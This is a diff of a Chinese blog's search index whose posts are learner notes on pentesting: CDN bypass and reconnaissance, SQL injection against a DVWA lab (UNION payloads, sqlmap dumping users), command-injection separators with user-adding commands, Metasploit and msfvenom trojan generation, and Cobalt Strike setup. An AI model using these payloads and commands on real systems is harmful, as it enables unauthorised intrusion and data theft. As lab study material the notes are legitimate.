@@ -4,63 +4,18 @@
   
     
     <entry>
-      <title>逆变器</title>
-      <link href="/2024/11/19/%E9%80%86%E5%8F%98%E5%99%A8/"/>
-      <url>/2024/11/19/%E9%80%86%E5%8F%98%E5%99%A8/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>储能逆变器</p><ol><li>设备<br>PV源与BAT源</li></ol><p>串口服务器</p><p>三相电表</p><ol start="2"><li><p>储能逆变器<br>储能逆变器是一种电力转换设备，结合了逆变器和储能技术的特点。它能够实现直流电与交流电之间的相互转换。当外部供电不足或不可用时，储能逆变器会将储存的直流电能转换为交流电能，满足用电需求。这些逆变器通常由输入端、输出端和控制系统组成。总之，储能逆变器能够突破传统光伏逆变器的局限性，为电网系统提供高品质的电能，同时降低用电成本、提高用电效率。</p></li><li><p>储能逆变器工作原理<br>直流输入:储能逆变器接收来自可再生能源装置（如太阳能电池板、风力发电机等）或其他直流电池的电能输入。这些直流电源经过滤波和电压调节等处理步骤，以保证稳定的输入电压和电流</p></li></ol><p>逆变过程:在逆变器部分，直流电能被转换为交流电能。通过使用开关管件，对电路进行控制，调整直流电源的电流大小和方向，从而产生所需的交流电信号。</p><p>交流输出：通过逆变后的交流电信号，储能逆变器可以输出给电网或其他负载。通过控制输出电压和频率，可以实现对电力系统的调节和平衡。</p><p>储能逆变器通常配备先进的控制系统，用于监测和管理储能设备的状态和性能。通过实时监测电能的变化和需求，控制系统可以智能调整储能逆变器的工作方式，以实现最佳的能源利用率和电力传输效率。</p><ol start="4"><li>光伏逆变器<br>是太阳能发电系统的核心部件，其主要功能是将直流电转换为交流电，并馈入电网或负荷使用。</li></ol><p>光伏逆变器通过功率半导体器件的开关动作，将直流电转换为交流电。这是光伏逆变的第一步</p><p>转换后的交流电需要进行升压或降压，以适应不同的应用需求。这通常通过变压器或电抗器等设备实现。</p><ol start="4"><li>PV源作用<br>PV源也叫光伏源</li></ol><p>光伏并网储能逆变器将光伏电池板产生的直流电转换为交流电，并输出给电网。</p><p>PV源的作用是将太阳能光伏发电系统的能量注入电网，提高电网对大规模可再生能源(如风能和光伏)的接纳能力</p><p>PV源还可以将多余的电脑存储在电池中，以提供光伏发电系统的稳定性</p><ol start="5"><li>BAT源作用<br>BAT源指的是储能电池组，如超级电容器组，蓄电池组、飞轮电池</li></ol><p>储能逆变器可以适配不同类型的直流储能单元，将电池的直流电逆变为交流电，输送给电网或其他交流负荷使用。</p><p>BAT源的作用是实现能量的双向传递：从电网到电池进行放充电，从电池到电网进行放电</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>xss</title>
-      <link href="/2024/11/15/xss/"/>
-      <url>/2024/11/15/xss/</url>
+      <link href="/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/xss/"/>
+      <url>/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/xss/</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="使用beef-xss进行跨站脚本攻击"><a href="#使用beef-xss进行跨站脚本攻击" class="headerlink" title="使用beef-xss进行跨站脚本攻击"></a>使用beef-xss进行跨站脚本攻击</h2>]]></content>
       
       
-      
-        <tags>
-            
-            <tag> 网络安全 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CDN</title>
-      <link href="/2024/11/15/cdn/"/>
-      <url>/2024/11/15/cdn/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="DNS域名信息收集"><a href="#DNS域名信息收集" class="headerlink" title="DNS域名信息收集"></a>DNS域名信息收集</h2><ol><li><p>CDN检测绕过</p><p>在做DNS域名时，我们要先判断该域名是否存在cdn</p></li><li><p>DNS域名信息收集分为两种情况，一种是有cdn，一种无cdn，有CDN绕过CDN找到源服务器，无CDN的情况下直接收集</p></li></ol><h2 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么"></a>CDN是什么</h2><p>CDN是内容分发网络，类似DNS服务器一样，用户发送数据直接发送到CDN服务器，然后以CDN服务器以服务器真实IP发送请求，然后CDN服务器再转发给用户。这个显示的是CDN服务器。CDN里面存储资源文件的缓存</p><h2 id="CDN具体流程"><a href="#CDN具体流程" class="headerlink" title="CDN具体流程"></a>CDN具体流程</h2><p>用户使用域名发送请求，通过DNS解析得到IP地址，该IP地址为CDN的IP地址，CDN处理请求，发送给源服务器，源服务器返回给CDN，CDN返回给用户。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol><li>有效防止DDOS攻击</li><li>防止攻击者对源服务器的端口探测</li></ol><h2 id="有CDN的情况下"><a href="#有CDN的情况下" class="headerlink" title="有CDN的情况下"></a>有CDN的情况下</h2><h3 id="怎样检测CDN"><a href="#怎样检测CDN" class="headerlink" title="怎样检测CDN"></a>怎样检测CDN</h3><ol><li><p>使用不同地方的ping服务器，查看对应响应IP地址是否唯一，如果不唯一，很可能是使用了CDN。有些不会直接显示，所以可以使用ping服务器网站，只要IP不唯一就可能使用了CDN.</p></li><li><p>ping服务器网站：</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><a href="https://ping.aizhan.com/">https://ping.aizhan.com/</a></p></li></ol><h3 id="CDN信息收集以及绕过"><a href="#CDN信息收集以及绕过" class="headerlink" title="CDN信息收集以及绕过"></a>CDN信息收集以及绕过</h3><ol><li><p>子域名</p><p>子域名与主域名在同一台服务器上，</p><p>子域名与主域名不在同一台服务器上</p></li><li><p>查找子域名的方式</p><p>google搜索引擎</p><p>在线站点</p><ol><li><a href="https://tool.chinaz.com/subdomain">https://tool.chinaz.com/subdomain</a></li><li><a href="https://www.virustotal.com/">https://www.virustotal.com</a></li></ol><p>其他工具</p><ol><li>layer子域名挖掘机</li></ol></li><li><p>国外ping</p><p>有些地方没有cdn节点，可以找到真实的IP地址</p><p><a href="https://check-host.net/check-ping">https://check-host.net/check-ping</a>?</p><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>多看一些冷门城市</p></li><li><p>历史的DNS解析记录。可能网站在部署之前或者人流量很少的时候没有购买CDN节点。</p><p><a href="https://dnsumpster.com/">https://dnsumpster.com/</a></p><p><a href="https://securitytralls.com/domain">https://securitytralls.com/domain</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></li><li><p>通过ico图表哈希</p><p>首先获取网站图表文件，通过图标文件到fofa等站点搜索</p></li><li><p>利用邮件系统</p><p>有的邮件系统跟服务器是同一个IP地址，尤其是中小企业</p></li><li><p>通过网站证书https</p><p>找到序列号</p><p>转成十进制</p><p>使用fofa.info搜索</p></li><li><p>SSL证书查询</p><p><a href="https://crt.sh/">https://crt.sh</a></p><p><a href="https://search.censys.io/cetficates/">https://search.censys.io/cetficates/</a></p></li><li><p>通过网站漏洞，如XSS注入，SSRF，反弹权限，敏感信息泄露</p></li><li><p>通过其他工具比如脚本</p><p>bypass_cdn   <a href="https://github.com/Pluto-123/Bypass_cdn">Pluto-123&#x2F;Bypass_cdn: 绕过CDN查找网站的真实IP地址</a></p></li><li><p>DDOS打光节点流量，不推荐</p></li></ol><h2 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h2><p>hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><h2 id="无CDN情况下"><a href="#无CDN情况下" class="headerlink" title="无CDN情况下"></a>无CDN情况下</h2><ol><li>whois</li><li>站长之家：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li><li>爱网站:<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></li><li>bugscaner:<a href="http://whois.bugscaner.com/">http://whois.bugscaner.com/</a></li><li>ICP备案网查询:<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></li></ol><h2 id="直接搜集"><a href="#直接搜集" class="headerlink" title="直接搜集"></a>直接搜集</h2><ol><li>企业Web网站：直接信息收集找网站漏洞</li><li>企业APP:通过app找url在web寻找漏洞 http</li><li>企业微信小程序：抓包小程序</li><li>企业有没有部署其他信息:有没有安装其他的软件比如向日葵，系统本身漏洞。</li></ol><h2 id="整站信息收集"><a href="#整站信息收集" class="headerlink" title="整站信息收集"></a>整站信息收集</h2><ol><li><p>服务器类型（windows&#x2F;linux）</p><p>大小写判断 nmp -O baidu.com</p><p>ping值判断 ttl 值 windows 128 linux 64</p></li><li><p>网站中间件</p><p>利用谷歌扩展(wappalyzer)探测</p><p>用whatweb工具探测： whatweb 域名</p><p><a href="http://finger.tidesec.com/%E9%80%9A%E8%BF%87%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">http://finger.tidesec.com/通过指纹识别</a></p><p>通过f12查看响应标头，来判断</p><p>谷歌语法site: filetype:php</p><p>通过网站的url</p><p>识别cms 识别网站开发框架 找框架的历史漏洞</p></li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="扫描网站敏感目录或者文件"><a href="#扫描网站敏感目录或者文件" class="headerlink" title="扫描网站敏感目录或者文件"></a>扫描网站敏感目录或者文件</h2><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><ol><li>100 请求者继续请求，正在等待其余部分</li><li>101 请求者要求服务器切换协议，服务器已确认并准备切换</li><li>2xx表示成功处理了请求：200 成功 201 已创建新的资源 202 已接受，但未处理 203非授权信息 204无内容 205重置内容 206部分内容</li><li>3XX 重定向，表示要完成请求，需要进一步操作，通常这些状态码是重定向</li><li>4XX 表示请求错误，妨碍了服务器处理 400 错误请求 401 未授权  403 禁止，服务器拒绝请求 404找不到请求的网页。。。</li><li>5XX 表示服务器内部错误，而不是请求出错</li></ol><h3 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a>工具扫描</h3><p>robots.txt 通过这个文件查看目录结构</p><p>disbuster <a href="https://sourceforge.net/projects/disbuster">https://sourceforge.net/projects/disbuster</a></p><p>dirsearch <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><h3 id="文件泄露"><a href="#文件泄露" class="headerlink" title="文件泄露"></a>文件泄露</h3><ol><li>.git文件泄露.如果发布代码的时候没有删除这个文件，可以恢复系统源码(<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</li></ol><h2 id="旁站查询及C段查询工具"><a href="#旁站查询及C段查询工具" class="headerlink" title="旁站查询及C段查询工具"></a>旁站查询及C段查询工具</h2><ol><li><p>C段是指IP地址第三个字节，通常包含256个不同IP地址，C段和目标服务器再同一个网络的其他服务器，通过对C段中所有IP地址进行扫描和探测就可以发现与目标服务器相关的其他服务器和活动。拿到一台服务器的权限就相当于进入了内网，C段的意义扩大攻击面。</p></li><li><p>旁站查询</p><p>利用方式：若旁站与主站为同一个内外，拿下旁站，便能拿下主站，若不为内网则考虑内网渗透。</p><p>站长之家同IP查询</p><p><a href="https://stool.chinaz.com/same">https://stool.chinaz.com/same</a></p><p>wenscan查询</p><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p>C 段查询</p><p>nmap -p l-65535 -pn xx.xx.xx.0&#x2F;24</p><p>masscan扫描  端口0-1000的127.0.0.0网段</p><p>masscan -p 0-1000 -pn 127.0.0.0&#x2F;24 -oJ desktop&#x2F;1.txt</p><p>fofa</p><p><a href="https://fofa.info/">https://fofa.info/</a></p><p>ip&#x3D;”x.x.x.x&#x2F;24”</p><h2 id="网站漏洞扫描"><a href="#网站漏洞扫描" class="headerlink" title="网站漏洞扫描"></a>网站漏洞扫描</h2><ol><li><p>awvs 漏洞扫描工具</p></li><li><p>appscan 漏洞扫描工具</p></li><li><p>xray 红队漏洞扫描 <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p><p> .\xray.exe webscan –basic-crawler <a href="http://www.ocean888.cn/">http://www.ocean888.cn/</a> –html-output xray-crawler-testphp.html</p></li></ol></li></ol>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 网络安全 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>cobaltstrike</title>
-      <link href="/2024/11/09/cobaltstrike/"/>
-      <url>/2024/11/09/cobaltstrike/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><p>简称为CS）是一款团队作战渗透神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户端连接。</p><h2 id="Server目录"><a href="#Server目录" class="headerlink" title="Server目录"></a>Server目录</h2><ol><li>修改Cobaltstrike可执行权限</li><li>运行.&#x2F;teamserver 192.168.190.128 123 这里分别是IP地址和密码</li></ol><h2 id="Client目录"><a href="#Client目录" class="headerlink" title="Client目录"></a>Client目录</h2><ol><li>打开客户端输入.&#x2F;cobaltstrike-client.cmd需要执行权限</li><li>IP地址为服务器IP，密码是服务器密码，账号随便输入。端口默认是50050</li></ol>]]></content>
-      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
       
       
         <tags>
@@ -75,30 +30,17 @@
     
     <entry>
       <title>Sql注入</title>
-      <link href="/2024/11/09/sqlinject/"/>
-      <url>/2024/11/09/sqlinject/</url>
+      <link href="/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/sqlinject/"/>
+      <url>/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/sqlinject/</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入也叫SQL注码，发生于应用程序与数据库层的安全漏洞。在设计的不良程序中，忽略了字符串检查，那么这些注入的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行。</p><h2 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h2><p>查询用户的SQL语句</p><p>select first_name,last_name from users where user_id&#x3D;’1*’ and 1&#x3D;1#*’</p><p>select first_name,last_name from users where user_id&#x3D;’1*’  or 1&#x3D;1#*’</p><p>斜体表示输入的内容，1总是等于1所以会被查询出来全部，#表示去掉后面有影响的SQL</p><h2 id="怎么利用SQL注入漏洞"><a href="#怎么利用SQL注入漏洞" class="headerlink" title="怎么利用SQL注入漏洞"></a>怎么利用SQL注入漏洞</h2><ol><li>判断列数&#x2F;字段数 order by [column_num]</li><li>select first_name,last_name from users where user_id&#x3D;’1*’  order by 1#*’</li><li>如果第一列存在肯定有输出，依次增加order by 的Num</li><li>select first_name,last_name from users where user_id&#x3D;’1*’  union select user(),database()#*’显示当前数据库连接用户和数据库名称</li><li>select first_name,last_name from users where user_id&#x3D;’<em>1’ union select table_name,table_schema from information_schema.tables where table_schema&#x3D;’dvwa’#</em>‘</li><li>发现有users表，找到users表</li><li>select first_name,last_name from users where user_id&#x3D;’1’ union select user,password from users#’</li></ol><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><ol><li>官网sqlmap.org</li><li>sqlmap -u “<a href="http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&Submit=Submit#">http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ –cookie&#x3D;”PHPSESSID&#x3D;i8gu0fjas4mrs30cjpklqcibc6; security&#x3D;low” –dbs   获取所有数据库名称</li><li>sqlmap -u “<a href="http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&Submit=Submit#">http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ –cookie&#x3D;”PHPSESSID&#x3D;i8gu0fjas4mrs30cjpklqcibc6; security&#x3D;low” -D dvwa –tables  获取数据库中的所有表 -D表示数据库</li><li>sqlmap -u “<a href="http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&Submit=Submit#">http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ –cookie&#x3D;”PHPSESSID&#x3D;i8gu0fjas4mrs30cjpklqcibc6; security&#x3D;low” -D dvwa -T users –columns  获取users表中的所有列</li><li>sqlmap -u “<a href="http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&Submit=Submit#">http://192.168.190.128:12345/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ –cookie&#x3D;”PHPSESSID&#x3D;i8gu0fjas4mrs30cjpklqcibc6; security&#x3D;low” -D dvwa -T users –dump  获取users表中的所有数据，后续可以选择是否破解密码</li></ol><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>过滤手动输入的内容，不让输入SQL语句</p>]]></content>
       
       
-      
-        <tags>
-            
-            <tag> 网络安全 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>DVWA</title>
-      <link href="/2024/11/09/dvwa/"/>
-      <url>/2024/11/09/dvwa/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="漏洞靶场之-DVWA"><a href="#漏洞靶场之-DVWA" class="headerlink" title="漏洞靶场之 DVWA"></a>漏洞靶场之 DVWA</h2><ol><li><p>为什么要攻击网站？常见的网站漏洞有哪些?</p><p>SQL注入  XSS  文件上传 反序列化 文件包含 CSRF 命令执行 信息泄露 XEE SSRF 未授权访问</p></li><li><p>SQL注入 </p><p>泄露数据库，数据库中可能有账号密码</p></li><li><p>命令执行</p><p>获取目标机器命令权限，执行非法命令，破坏或控制受害机器</p></li><li><p>文件上传</p><p>上传后门病毒木马到网站中，破坏网站</p></li></ol><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><ol><li><p>cmd1|cmd2:无论cmd1是否执行成功，cmd2将被执行</p></li><li><p>cmd1;cmd2:无论cmd1是否执行成功，cmd2将被执行</p></li><li><p>cmd1&amp;cmd2:无论cmd1是否执行成功，cmd2将被执行</p></li><li><p>cmd1||cmd2:仅在cmd1执行失败，执行cmd2</p></li><li><p>cmd1&amp;&amp;cmd2:仅在cmd1执行成功，执行cmd2</p></li><li><p>常用cmd指令</p><p>whoami 查看当前用户名  ipconfig查看网卡 shutdown -s -t - 0关机</p><p>net user [username] [password] &#x2F;add 增加一个用户名为username密码为password的新用户</p><p>type [file_name] 查看filename文件内容</p></li><li><p>防御命令执行漏洞</p><p>禁止输入特殊字符|;&amp;||&amp;&amp;,处理特殊符号</p></li></ol><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><p>可以看到源代码，查看源代码过滤机制</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>一个个试，看不到源代码</p><h2 id="防御impossible"><a href="#防御impossible" class="headerlink" title="防御impossible"></a>防御impossible</h2><p>通过算法过滤掉不合格的输入</p>]]></content>
-      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
       
       
         <tags>
@@ -113,16 +55,122 @@
     
     <entry>
       <title>msfconsole</title>
-      <link href="/2024/11/01/msfconsole/"/>
-      <url>/2024/11/01/msfconsole/</url>
+      <link href="/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/msfconsole/"/>
+      <url>/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/msfconsole/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>使用metasploit攻击三步走</p></li><li><p>使用模块-选择参数-发起攻击</p></li><li><p>比如搜索漏洞search ms17-010搜索永恒之蓝漏洞</p></li><li><p>use 模块名称</p></li><li><p>配置模块必选项 set </p></li><li><p>运行模块run</p><p><img src="/..%5Cimages%5Cimage-20241102002826020.png" alt="image-20241102002826020"></p><p><img src="/..%5Cimages%5Cimage-20241102003009341.png" alt="image-20241102003009341"></p><p><img src="/..%5Cimages%5Cimage-20241102002826021.png" alt="image-20241102003136876"></p></li><li><p>退出按exit</p></li></ol><h2 id="使用msfvenom生成远控木马"><a href="#使用msfvenom生成远控木马" class="headerlink" title="使用msfvenom生成远控木马"></a>使用msfvenom生成远控木马</h2><ol><li>msfvenom是用于生成远控木马的软件，在本地监听上线，msfvenom在shell里面使用不是msfconsole终端</li><li>指令格式如下：</li></ol><ul><li>lhost&#x3D;192.168.190.129 lport&#x3D;9999 -f exe -o demo.exe</li><li>-p表示payload 系统&#x2F;架构&#x2F;作用&#x2F;方式 -f表示格式</li><li>-o表示输出文件</li></ul><h2 id="设置多模块攻击"><a href="#设置多模块攻击" class="headerlink" title="设置多模块攻击"></a>设置多模块攻击</h2><ol><li>use exploit&#x2F;multi&#x2F;handler 使用这个模块</li><li>set lhost 设置本地IP</li><li>set lport 设置本地端口</li><li>run 运行模块并，等待木马被执行</li><li>有会话连接就是中招了</li></ol>]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>使用metasploit攻击三步走</p></li><li><p>使用模块-选择参数-发起攻击</p></li><li><p>比如搜索漏洞search ms17-010搜索永恒之蓝漏洞</p></li><li><p>use 模块名称</p></li><li><p>配置模块必选项 set </p></li><li><p>运行模块run</p><p><img src="/images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20241102002826020.png" alt="image-20241102002826020"></p><p><img src="/images/%E7%BD%91%E7%BB%9C/image-20241102003009341.png" alt="image-20241102003009341"></p><p><img src="/images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20241102002826021.png" alt="image-20241102003136876"></p></li><li><p>退出按exit</p></li></ol><h2 id="使用msfvenom生成远控木马"><a href="#使用msfvenom生成远控木马" class="headerlink" title="使用msfvenom生成远控木马"></a>使用msfvenom生成远控木马</h2><ol><li>msfvenom是用于生成远控木马的软件，在本地监听上线，msfvenom在shell里面使用不是msfconsole终端</li><li>指令格式如下：</li></ol><ul><li>lhost&#x3D;192.168.190.129 lport&#x3D;9999 -f exe -o demo.exe</li><li>-p表示payload 系统&#x2F;架构&#x2F;作用&#x2F;方式 -f表示格式</li><li>-o表示输出文件</li></ul><h2 id="设置多模块攻击"><a href="#设置多模块攻击" class="headerlink" title="设置多模块攻击"></a>设置多模块攻击</h2><ol><li>use exploit&#x2F;multi&#x2F;handler 使用这个模块</li><li>set lhost 设置本地IP</li><li>set lport 设置本地端口</li><li>run 运行模块并，等待木马被执行</li><li>有会话连接就是中招了</li></ol>]]></content>
       
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
       
       
         <tags>
             
             <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DVWA</title>
+      <link href="/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/dvwa/"/>
+      <url>/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/dvwa/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="漏洞靶场之-DVWA"><a href="#漏洞靶场之-DVWA" class="headerlink" title="漏洞靶场之 DVWA"></a>漏洞靶场之 DVWA</h2><ol><li><p>为什么要攻击网站？常见的网站漏洞有哪些?</p><p>SQL注入  XSS  文件上传 反序列化 文件包含 CSRF 命令执行 信息泄露 XEE SSRF 未授权访问</p></li><li><p>SQL注入 </p><p>泄露数据库，数据库中可能有账号密码</p></li><li><p>命令执行</p><p>获取目标机器命令权限，执行非法命令，破坏或控制受害机器</p></li><li><p>文件上传</p><p>上传后门病毒木马到网站中，破坏网站</p></li></ol><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><ol><li><p>cmd1|cmd2:无论cmd1是否执行成功，cmd2将被执行</p></li><li><p>cmd1;cmd2:无论cmd1是否执行成功，cmd2将被执行</p></li><li><p>cmd1&amp;cmd2:无论cmd1是否执行成功，cmd2将被执行</p></li><li><p>cmd1||cmd2:仅在cmd1执行失败，执行cmd2</p></li><li><p>cmd1&amp;&amp;cmd2:仅在cmd1执行成功，执行cmd2</p></li><li><p>常用cmd指令</p><p>whoami 查看当前用户名  ipconfig查看网卡 shutdown -s -t - 0关机</p><p>net user [username] [password] &#x2F;add 增加一个用户名为username密码为password的新用户</p><p>type [file_name] 查看filename文件内容</p></li><li><p>防御命令执行漏洞</p><p>禁止输入特殊字符|;&amp;||&amp;&amp;,处理特殊符号</p></li></ol><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><p>可以看到源代码，查看源代码过滤机制</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>一个个试，看不到源代码</p><h2 id="防御impossible"><a href="#防御impossible" class="headerlink" title="防御impossible"></a>防御impossible</h2><p>通过算法过滤掉不合格的输入</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cobaltstrike</title>
+      <link href="/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/cobaltstrike/"/>
+      <url>/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/cobaltstrike/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><p>简称为CS）是一款团队作战渗透神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户端连接。</p><h2 id="Server目录"><a href="#Server目录" class="headerlink" title="Server目录"></a>Server目录</h2><ol><li>修改Cobaltstrike可执行权限</li><li>运行.&#x2F;teamserver 192.168.190.128 123 这里分别是IP地址和密码</li></ol><h2 id="Client目录"><a href="#Client目录" class="headerlink" title="Client目录"></a>Client目录</h2><ol><li>打开客户端输入.&#x2F;cobaltstrike-client.cmd需要执行权限</li><li>IP地址为服务器IP，密码是服务器密码，账号随便输入。端口默认是50050</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CDN</title>
+      <link href="/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/cdn/"/>
+      <url>/2024/11/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/cdn/</url>
+      
